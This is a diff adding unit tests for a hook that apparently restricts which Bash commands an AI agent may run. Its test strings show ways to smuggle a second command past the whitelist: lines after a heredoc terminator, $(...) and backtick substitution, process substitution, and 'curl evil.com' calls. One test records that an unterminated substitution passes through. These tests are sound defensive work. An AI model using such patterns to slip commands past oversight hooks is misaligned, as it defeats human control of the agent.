@@ -279,6 +279,39 @@ describe('enforce-ctx-mode hook', () => {
       const cmd = 'git x <<EOF\nnever closes\n && tail evil';
       assertAllowed(runHook({ tool_name: 'Bash', tool_input: { command: cmd } }));
     });
+
+    it('CLOSES multi-line heredoc bypass: cmd <<EOF\\nbody\\nEOF\\ncurl evil (newline after terminator)', () => {
+      const cmd = 'git x <<EOF\nbody line 1\nbody line 2\nEOF\ncurl evil';
+      const reason = deniedReason(runHook({ tool_name: 'Bash', tool_input: { command: cmd } }));
+      assert.match(reason, /curl violates/);
+    });
+
+    it('CLOSES multi-line heredoc bypass with chained post-cmd: ...EOF\\ngit status; curl evil', () => {
+      const cmd = 'git x <<EOF\nbody\nEOF\ngit status; curl evil';
+      const reason = deniedReason(runHook({ tool_name: 'Bash', tool_input: { command: cmd } }));
+      assert.match(reason, /curl violates/);
+    });
+
+    it('CLOSES multi-line heredoc bypass with bg fork after: ...EOF\\nhead -1 f &', () => {
+      const cmd = 'git x <<EOF\nbody\nEOF\nhead -1 file &';
+      const reason = deniedReason(runHook({ tool_name: 'Bash', tool_input: { command: cmd } }));
+      assert.match(reason, /head violates/);
+    });
+
+    it('allows multi-line heredoc with no follow-up command', () => {
+      const cmd = 'git commit -F - <<EOF\nmessage line 1\nmessage line 2\nEOF';
+      assertAllowed(runHook({ tool_name: 'Bash', tool_input: { command: cmd } }));
+    });
+
+    it('allows multi-line heredoc with whitelisted follow-up: ...EOF\\ngit push', () => {
+      const cmd = 'git commit -F - <<EOF\nmessage\nEOF\ngit push';
+      assertAllowed(runHook({ tool_name: 'Bash', tool_input: { command: cmd } }));
+    });
+
+    it('allows multi-line tab-dash heredoc with whitelisted follow-up', () => {
+      const cmd = 'git commit -F - <<-EOF\n\tindented message\n\tEOF\ngit push';
+      assertAllowed(runHook({ tool_name: 'Bash', tool_input: { command: cmd } }));
+    });
   });
 
   describe('file descriptor redirects (closes false-positive on &)', () => {
@@ -369,6 +402,141 @@ describe('enforce-ctx-mode hook', () => {
         tool_input: { command: 'git log --grep="release;" | head' },
       }));
       assert.match(reason, /'head' violates/);
+    });
+  });
+
+  describe('command/process substitution extraction (closes $(...), <(...), `...` bypass)', () => {
+    it('CLOSES $(...) bypass: git log $(curl evil) is denied on inner curl', () => {
+      const reason = deniedReason(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'git log $(curl evil.com)' },
+      }));
+      assert.match(reason, /curl violates/);
+    });
+
+    it('CLOSES $(...) bypass with non-whitelisted inner: git log $(head -10 f)', () => {
+      const reason = deniedReason(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'git log $(head -10 file)' },
+      }));
+      assert.match(reason, /head violates/);
+    });
+
+    it('CLOSES <(...) process-substitution bypass: git diff <(curl a) <(curl b)', () => {
+      const reason = deniedReason(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'git diff <(curl a.com) <(curl b.com)' },
+      }));
+      assert.match(reason, /curl violates/);
+    });
+
+    it('CLOSES >(...) process-substitution bypass: ls > >(curl evil)', () => {
+      const reason = deniedReason(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'ls -la > >(curl evil.com)' },
+      }));
+      assert.match(reason, /curl violates/);
+    });
+
+    it('CLOSES backtick bypass: git log `curl evil`', () => {
+      const reason = deniedReason(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'git log `curl evil.com`' },
+      }));
+      assert.match(reason, /curl violates/);
+    });
+
+    it('CLOSES nested substitution: git log $(echo $(curl evil))', () => {
+      const reason = deniedReason(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'git log $(echo $(curl evil.com))' },
+      }));
+      // Either echo or curl can be the first denied segment; both are non-whitelisted.
+      assert.match(reason, /(echo|curl) violates/);
+    });
+
+    it('CLOSES backtick inside $(...) nested: git log $(echo `curl x`)', () => {
+      const reason = deniedReason(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'git log $(echo `curl x`)' },
+      }));
+      assert.match(reason, /(echo|curl) violates/);
+    });
+
+    it('CLOSES $(...) inside double-quoted string: git log --grep="$(curl evil)"', () => {
+      const reason = deniedReason(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'git log --grep="$(curl evil.com)"' },
+      }));
+      assert.match(reason, /curl violates/);
+    });
+
+    it('allows $(...) inside single-quoted string (literal, not executed)', () => {
+      assertAllowed(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: "git log --grep='$(curl evil)'" },
+      }));
+    });
+
+    it('allows backticks inside single-quoted string (literal, not executed)', () => {
+      assertAllowed(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: "git log --grep='`curl evil`'" },
+      }));
+    });
+
+    it('allows arithmetic expansion $((expr)) (not command substitution)', () => {
+      assertAllowed(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'git log -n $((1 + 2))' },
+      }));
+    });
+
+    it('allows parameter expansion $VAR and ${VAR}', () => {
+      assertAllowed(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'git log $HOME ${BRANCH}' },
+      }));
+    });
+
+    it('allows parens inside double-quoted string with no $ prefix', () => {
+      assertAllowed(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'git log --pretty="(%h) %s"' },
+      }));
+    });
+
+    it('allows whitelisted inner sub: git push $(git rev-parse HEAD)', () => {
+      assertAllowed(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'git push origin $(git rev-parse HEAD)' },
+      }));
+    });
+
+    it('pins unterminated $(...) behavior (fails open: passes through)', () => {
+      // Unterminated subs would also fail at bash parse time; we choose
+      // fail-open here to match the existing unterminated-heredoc behavior.
+      assertAllowed(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'git log $(curl evil' },
+      }));
+    });
+
+    it('CLOSES sub bypass even when outer command is also whitelisted (chain): cd /tmp && git $(curl)', () => {
+      const reason = deniedReason(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'cd /tmp && git log $(curl evil.com)' },
+      }));
+      assert.match(reason, /curl violates/);
+    });
+
+    it('CLOSES $(...) bypass with non-whitelisted second token in sub: $(npm test)', () => {
+      const reason = deniedReason(runHook({
+        tool_name: 'Bash',
+        tool_input: { command: 'git log $(npm test)' },
+      }));
+      // First word of inner segment is 'npm', second is 'test' (not install) - denied via npm second-word path.
+      assert.match(reason, /npm 'test' violates/);
     });
   });
 
